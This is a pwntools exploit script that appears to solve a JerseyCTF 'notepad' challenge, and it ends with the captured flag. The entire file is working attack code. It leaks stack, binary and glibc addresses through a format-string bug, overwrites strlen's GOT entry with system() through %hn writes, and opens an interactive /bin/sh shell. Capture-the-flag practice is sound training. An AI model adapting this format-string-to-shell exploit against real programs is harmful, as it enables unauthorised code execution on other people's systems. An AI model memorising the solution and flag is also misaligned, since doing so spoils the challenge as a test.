from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./notepad_patched', '''
    b *create
    b *edit
    b *delete
    b *print
    continue
''')

# p = remote('mallorcy.aws.jerseyctf.com', 9001)

def create_note(content):
    p.recvuntil(b'3: Print A note\n')
    p.sendline(b'0')
    p.recvuntil(b'please enter content:\n')
    p.sendline(content)

def edit_note(index, content):
    p.recvuntil(b'3: Print A note\n')
    p.sendline(b'1')
    p.recvuntil(b'Which note would you like to edit?\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'please enter content:\n')
    p.sendline(content)

def delete_note(index):
    p.recvuntil(b'3: Print A note\n')
    p.sendline(b'2')
    p.recvuntil(b'Which note would you like to delete?\n')
    p.sendline(str(index).encode())
    
def print_note(index):
    p.recvuntil(b'3: Print A note\n')
    p.sendline(b'3')
    p.recvuntil(b'Which note would you like to print?\n')
    p.sendline(str(index).encode())
    p.recvuntil(b'contains:\n')
    return p.recvline()

e = ELF('./notepad_patched')
glibc_e = ELF('./libc.so.6')

create_note(b'A'*0x18)
edit_note(0, b'%8$p')
target_stack_addr = int(print_note(0).strip().decode(), 16)
log.info(f'target stack address: {hex(target_stack_addr)}')
edit_note(0, b'%9$p')
elf_base_addr = int(print_note(0).strip().decode(), 16)-0x16b8
log.info(f'elf base address: {hex(elf_base_addr)}')
edit_note(0, b'%29$p')
glibc_base_addr = int(print_note(0).strip().decode(), 16)-0x24c56
log.info(f'glibc base address: {hex(glibc_base_addr)}')

edit_note(0, f'%{(target_stack_addr+0x8)&0xffff}c%8$hn'.encode())
print_note(0)

for i in range(3):
    edit_note(0, f'%{(elf_base_addr+e.got.strlen+i)&0xffff}c%26$hn'.encode())
    print_note(0)
    edit_note(0, f'%{(glibc_base_addr+glibc_e.symbols.system)>>(8*i)&0xff}c%27$hhn'.encode())
    print_note(0)

create_note(b'/bin/sh\0')

p.interactive()

# jctfv{WHAT_4_L04D_0F_M4LL4RCY_a1520eb}